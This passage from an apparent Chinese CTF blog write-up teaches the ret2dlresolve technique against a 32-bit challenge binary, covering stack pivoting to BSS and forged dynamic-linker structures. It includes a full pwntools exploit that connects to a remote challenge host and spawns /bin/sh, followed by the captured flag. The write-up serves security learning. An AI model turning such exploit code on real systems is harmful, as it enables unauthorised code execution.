+<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><p>ret2dlresolve需要的空间比较多，24字节不够用，需要先做栈迁移。借助read函数读取payload1，用leave;ret将栈迁移到bss段的bss_addr，再次调用read函数。leave_ret gadget的地址可以用ROPgadget工具找到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = <span class="number">0x0804A020</span> + <span class="number">0x800</span></span><br><span class="line">leave_ret = <span class="number">0x08048455</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p32(bss_addr) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x400</span>)  <span class="comment"># read(0, bss_addr, 0x400)</span></span><br><span class="line">p.send(payload1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><p>转移到bss段，读入payload2，payload2包含两部分：</p>
+<p><strong>ROP链</strong>：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 调用 PLT_0 执行解析</span></span><br><span class="line">rop = p32(bss_addr + <span class="number">0x500</span>)             <span class="comment"># ebp</span></span><br><span class="line">rop += p32(plt_0)                 <span class="comment"># 跳转到解析器入口</span></span><br><span class="line">rop += p32(reloc_offset)          <span class="comment"># 伪造的重定位偏移</span></span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>) + p32(binsh_str)            <span class="comment"># system的返回地址和参数</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>跳转到PLT[0]，从而调用<code>_dl_runtime_resolve</code> 函数，提供伪造的偏移reloc_offset</li>
+<li>给system函数的返回地址和参数（&#x2F;bin&#x2F;sh字符串的地址）</li>
+</ol>
+<p><strong>数据部分</strong>：</p>
+<ol>
+<li><p>伪造的Elf32_Rel和Elf32_Sym表，用于欺骗_dl_runtime_resolve，让其认为自己需要找叫“system”的函数</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造伪造的结构体</span></span><br><span class="line">fake_reloc = p32(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) + p32(r_info)</span><br><span class="line"><span class="comment"># st_name + st_value + st_size + st_info</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>存放system和&#x2F;bin&#x2F;sh字符串</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 = payload2.ljust(system_str - bss_addr, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += <span class="string">b&quot;system\x00&quot;</span></span><br><span class="line">payload2 = payload2.ljust(binsh_str - bss_addr, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>需要注意的是Elf32_Rel和Elf32_Sym表有严格的结构，需要小心对齐</p>
+<h4 id="调试的一些："><a href="#调试的一些：" class="headerlink" title="调试的一些："></a>调试的一些：</h4><p>进入dl_runtime_resolve之后在gdb里验证一下有没有改成功</p>
+<p>这个地址是elf.got[‘alarm’]，也就是.got.plt里的alarm（要改的函数的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/wx 0804A010</span><br></pre></td></tr></table></figure>
+
+<p>然后再看看system的地址。看有没有改对</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="string">&quot;70&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;new-window&quot;]</span></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./stack&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment"># p = process(file_path)</span></span><br><span class="line">p = remote(<span class="string">&#x27;124.16.75.116&#x27;</span>,<span class="number">52005</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b read</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(p, cmd)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804A020</span> + <span class="number">0x800</span></span><br><span class="line">leave_ret = <span class="number">0x08048455</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p32(bss_addr) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x400</span>)  <span class="comment"># read(0, bss_addr, 0x400)</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键地址获取</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对齐计算</span></span><br><span class="line">addr_reloc = bss_addr + <span class="number">24</span>   </span><br><span class="line">addr_sym = addr_reloc + <span class="number">8</span></span><br><span class="line"><span class="keyword">while</span> (addr_sym - dynsym) % <span class="number">16</span> != <span class="number">0</span>: <span class="comment"># 必须 16 字节对齐</span></span><br><span class="line">    addr_sym += <span class="number">1</span></span><br><span class="line">system_str = addr_sym + <span class="number">16</span></span><br><span class="line">binsh_str = system_str + <span class="number">10</span></span><br><span class="line">log.info(<span class="string">&quot;system_str: &quot;</span> + <span class="built_in">hex</span>(system_str))</span><br><span class="line">log.info(<span class="string">&quot;binsh_str: &quot;</span> + <span class="built_in">hex</span>(binsh_str))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算偏移</span></span><br><span class="line">reloc_offset = addr_reloc - rel_plt</span><br><span class="line">st_name = system_str - dynstr</span><br><span class="line">r_info = ((addr_sym - dynsym) // <span class="number">16</span>) &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 PLT_0 执行解析</span></span><br><span class="line">rop = p32(bss_addr + <span class="number">0x500</span>)             <span class="comment"># ebp</span></span><br><span class="line">rop += p32(plt_0)                 <span class="comment"># 跳转到解析器入口</span></span><br><span class="line">rop += p32(reloc_offset)          <span class="comment"># 伪造的重定位偏移</span></span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>) + p32(binsh_str)            <span class="comment"># system的返回地址和参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造伪造的结构体</span></span><br><span class="line">fake_reloc = p32(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) + p32(r_info)</span><br><span class="line"><span class="comment"># st_name + st_value + st_size + st_info</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 拼接完整的 Payload 2</span></span><br><span class="line">payload2 = rop.ljust(addr_reloc - bss_addr, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 = payload2.ljust(addr_sym - bss_addr, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 = payload2.ljust(system_str - bss_addr, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += <span class="string">b&quot;system\x00&quot;</span></span><br><span class="line">payload2 = payload2.ljust(binsh_str - bss_addr, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf&#123;ret_2_dl_resolve&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="技术点总结"><a href="#技术点总结" class="headerlink" title="技术点总结"></a>技术点总结</h3><ol>
+<li><p><strong>栈迁移</strong>：当函数栈帧内的缓冲区溢出空间不足以布置完整的 ROP 链时，需将程序执行流引导至内存空间更充裕的区域（如 BSS 段）。通常可以利用 <code>leave; ret</code> 这个gadget实现劫持，将 <code>esp</code> 切换至目标地址，获取更大的操作空间</p>
+</li>
+<li><p><strong>32位函数调用约定</strong>：在 i386 架构中，函数参数通过栈传递，而非寄存器。调用者在执行 <code>call</code> 指令前，按参数反序将其压入栈中。函数执行时，通过相对于 <code>esp</code> 或 <code>ebp</code> 的偏移量来访问这些参数。这种机制决定了在构造 ROP 链时，只需在栈上模拟该布局：将目标函数地址作为返回地址写入，其后紧跟该函数执行完后的返回地址，再之后依次排列各项参数。</p>
+</li>
+<li><p><strong>动态链接与延迟绑定</strong> ：Linux 默认采用延迟绑定机制，只有在函数首次被调用时才进行地址解析。首次调用时，程序跳转至 PLT 项，压入该函数的重定位偏移量后进入 <code>PLT[0]</code>。<code>PLT[0]</code> 将代表库信息的 <code>link_map</code> 地址压栈并跳转至动态链接器的 <code>_dl_runtime_resolve</code> 函数。该函数根据偏移量查找符号表，定位真实函数地址并写入 GOT 表，最后直接跳转执行。</p>
+</li>
+<li><p><strong>Ret2dlresolve 攻击技术</strong>：通过伪造动态链接器解析过程所需的数据结构，欺骗链接器加载任意函数。攻击者在可写内存中手工构造虚假的 Elf32_Rel（重定位项）、Elf32_Sym（符号项）以及函数名字符串，控制传给 <code>_dl_runtime_resolve</code> 的 <code>reloc_offset</code> 参数，引导链接器读取这些伪造结构。在Full RELRO防护下不可用。</p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Mintind
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/" title="Return to dl_resolve">https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/ret2dlresolve/" rel="tag"># ret2dlresolve</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/04/06/CTF/PWN/House_of_orange/" rel="prev" title="House of Orange">
+                  <i class="fa fa-angle-left"></i> House of Orange
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/04/08/CTF/Web/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/" rel="next" title="gogogo路径穿越">
+                  gogogo路径穿越 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+  <div class="languages">
+    <label class="lang-select-label">
+      <i class="fa fa-language"></i>
+      <span>简体中文</span>
+      <i class="fa fa-angle-up" aria-hidden="true"></i>
+    </label>
+    <select class="lang-select" data-canonical="" aria-label="选择语言">
+      
+        <option value="zh-CN" data-href="/2026/04/07/CTF/PWN/return_to_dl_resolve/" selected="">
+          简体中文
+        </option>
+      
+        <option value="en" data-href="/en/2026/04/07/CTF/PWN/return_to_dl_resolve/" selected="">
+          English
+        </option>
+      
+    </select>
+  </div>
+
+  <div class="copyright">
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Mintind</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">203k</span>
+  </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
